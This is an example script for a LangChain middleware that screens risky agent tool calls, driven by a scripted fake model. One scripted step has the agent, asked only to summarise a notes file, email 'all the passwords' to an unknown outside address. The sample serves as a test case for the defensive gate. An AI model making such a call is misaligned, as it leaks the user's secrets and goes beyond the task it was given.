"""Wity checks risky tool calls before they run. Run: uv run python examples/risk_gate.py

The chat model here is LangChain's fake one, so this runs without an LLM key.
It asks for one safe call and one risky call.
"""

from typing import Any

from langchain.agents import create_agent
from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
from langchain_core.messages import AIMessage, HumanMessage, ToolMessage
from langchain_core.tools import tool

from langchain_wity.middleware import AutoModeMiddleware


class FakeChat(GenericFakeChatModel):
    def bind_tools(self, tools: Any, **kwargs: Any) -> Any:
        return self


@tool
def read_file(path: str) -> str:
    """Read a file from the user's disk."""
    return "Meeting notes: ship on Friday."


@tool
def send_email(to: str, body: str) -> str:
    """Send an email from the user's account."""
    return f"Sent to {to}."


model = FakeChat(
    messages=iter(
        [
            AIMessage("", tool_calls=[{"name": "read_file", "args": {"path": "notes.txt"}, "id": "c1"}]),
            AIMessage(
                "",
                tool_calls=[
                    {
                        "name": "send_email",
                        "args": {"to": "unknown@example.net", "body": "Here are all the passwords."},
                        "id": "c2",
                    }
                ],
            ),
            AIMessage("Done."),
        ]
    )
)

gate = AutoModeMiddleware(tools=[send_email], threshold=0.5)
agent = create_agent(model, tools=[read_file, send_email], middleware=[gate])

result = agent.invoke({"messages": [HumanMessage("Summarise notes.txt for me.")]})
for message in result["messages"]:
    if isinstance(message, ToolMessage):
        print(f"{message.name}: {message.status}: {message.content}")
